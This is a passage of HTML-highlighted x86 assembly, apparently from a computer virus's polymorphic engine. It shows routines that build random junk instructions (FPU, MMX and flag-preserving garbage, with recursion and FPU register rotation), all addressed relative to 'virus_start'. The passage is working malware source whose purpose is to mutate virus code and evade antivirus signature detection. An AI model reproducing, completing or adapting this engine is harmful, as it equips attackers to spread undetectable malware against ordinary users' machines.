        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; jump placed ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__g_cmath_test</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">a_copro_math</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">

</span><span class="sc5">a_copro_math</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate fsin/fcos/fsincos/fpatan/fabs/frndint/ffree/fxch... ÃÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">g_copro_others</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">; where we're in memory</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gr_where_in_mem</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">a_copro_others</span><span class="sc0">

        </span><span class="sc1">; use copro-garbage... ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc1">; select a random instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_copro_others</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_copro_others</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_copro_others</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; must I modify reg ?</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__co_modify_reg</span><span class="sc0">

        </span><span class="sc1">; select a free reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_set</span><span class="sc0">

        </span><span class="sc6">lodsw</span><span class="sc0">               </span><span class="sc1">;load instruction to AX</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__copro_reset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">   </span><span class="sc1">;here was bug !!</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__co_modify_reg</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;only FFREE ST(x), FXCH ST(x)</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_copro</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">           </span><span class="sc1">;set a free copro-reg</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">

</span><span class="sc5">a_copro_others</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate fully 46 instructions of MMX ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This functions can generate many instructions for IA-MMX</span><span class="sc0">
        </span><span class="sc1">;It's instructions for adding, subtractive, comparing ...</span><span class="sc0">
        </span><span class="sc1">;oparations. I also know IA-MMX-2 instructions and MMX</span><span class="sc0">
        </span><span class="sc1">;instructions for Cyrix CPU but I don't support them.</span><span class="sc0">
        </span><span class="sc1">;The sutructure of one MMX instruction is following:</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;   0Fh, byte from table, 0C0h + dest SHL 3 + src</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;where dest is an empty MMX register and src is any</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">g_mmx</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc1">; does CPU support MMX ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_start</span><span class="sc0">

        </span><span class="sc1">; get any instruction</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">end_mmx_others</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_mmx_others</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_mmx_others</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; build one</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Fh</span><span class="sc0">          </span><span class="sc1">;MMX identification</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">;and not only one</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc1">; get registers</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg_mmx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; finish test</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__mmx_test_finish</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ generate some garbage code ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;This main function can generate garbages from my great</span><span class="sc0">
        </span><span class="sc1">;table. Function can be recursived but it can't generate</span><span class="sc0">
        </span><span class="sc1">;copro garbages yet. You can set (garbage_style) if you</span><span class="sc0">
        </span><span class="sc1">;wanna generate unmodify flags instructions.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">gen_garbage</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">gg_exit</span><span class="sc0">

        </span><span class="sc1">; are registers full ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0EFh</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">gg_exit</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000004h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__gg_loop</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc1">; have I use unmodify flags instructions ?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc5">USED_FLAGS</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ggl_flags</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_no_flags</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_no_flags</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_no_flags</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gg_test</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__gg_finish</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">*</span><span class="sc8">eax</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">__gg_jump</span><span class="sc0">

    </span><span class="sc5">__ggl_flags</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">end_garbage</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">tbl_garbage</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__gg_test</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc5">__gg_finish</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">tbl_garbage</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc5">__gg_jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">__gg_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__gg_loop</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">

</span><span class="sc5">gg_exit</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">recursive_level</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">__gg_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">USED_BASED</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ggt_copro</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">__garbage_based_num</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__ggt_failed</span><span class="sc0">
    </span><span class="sc5">__ggt_copro</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">USED_COPRO</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ggt_mmx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">__garbage_based_num</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">__garbage_copro_num</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">__ggt_success</span><span class="sc0">
    </span><span class="sc5">__ggt_mmx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc5">USED_MMX</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__ggt_success</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">__garbage_copro_num</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">__garbage_mmx_num</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">  </span><span class="sc5">__ggt_success</span><span class="sc0">
    </span><span class="sc5">__ggt_failed</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc5">__ggt_success</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">; generate only based-garbage</span><span class="sc0">
</span><span class="sc5">gen_garbage_based</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc5">USED_BASED</span><span class="sc0">
</span><span class="sc5">gen_garbage_no_finish</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gen_garbage</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc1">; gnerate garbage which will not modify flags (mov,stack...)</span><span class="sc0">
</span><span class="sc5">gen_garbage_no_flags</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">garbage_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc5">USED_FLAGS</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">gen_garbage_no_finish</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ function to rotate with coprocessor regs  ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

        </span><span class="sc1">;---------------------------------------------------------</span><span class="sc0">
        </span><span class="sc1">;These functions MUST be called consecutively. The main</span><span class="sc0">
        </span><span class="sc1">;problem is that I can't get value from ST(6) directly.</span><span class="sc0">
        </span><span class="sc1">;I must ST(6) move to ST(0) and then I may read/write there.</span><span class="sc0">
        </span><span class="sc1">;And then move ST(0) to ST(6). I've got two way (which I</span><span class="sc0">
        </span><span class="sc1">;know). Use FINCSTP/FDECSTP or FXCH ST(x). Because I'm</span><span class="sc0">
        </span><span class="sc1">;so mad I will use both way but for FINCSTP/FDECSTP I use</span><span class="sc0">
        </span><span class="sc1">;only standard LOOP because I would have to rewrite</span><span class="sc0">
        </span><span class="sc1">;DEC reg(8/16/32), JNZ jump for copro-using. Never mind.</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc1">;input:        AL=what ST(x) to modify -&gt; write to ST(0)</span><span class="sc0">
        </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc5">__cs_mode</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;__set OR __reset ?</span><span class="sc0">
        </span><span class="sc5">__cs_reg</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;copro reg</span><span class="sc0">
        </span><span class="sc5">__cs_reg_count</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;base-reg like a counter</span><span class="sc0">
        </span><span class="sc5">__cs_style</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;FDECSTP/FINCSTP or FXCH ?</span><span class="sc0">
        </span><span class="sc5">__cs_decinc</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">   </span><span class="sc1">;0=FINCSTP, 1=FDECSTP</span><span class="sc0">
</span><span class="sc5">__copro_set</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_mode</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_style</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">pusha</span><span class="sc0">

        </span><span class="sc1">; choose between FDECSTP/FINCSTP and FXCH ST(x)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00000002h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd_range</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">__cs_xchg</span><span class="sc0">

        </span><span class="sc1">; disable base-reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_empty_reg</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">__reg_to_bcd</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">used_regs</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_reg_count</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_style</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_decinc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ppe_get_rnd32</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__cs_decinc_okay</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__cs_decinc</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">__cs_decinc_okay</span><span class="sc4">:</span><span class="sc0">
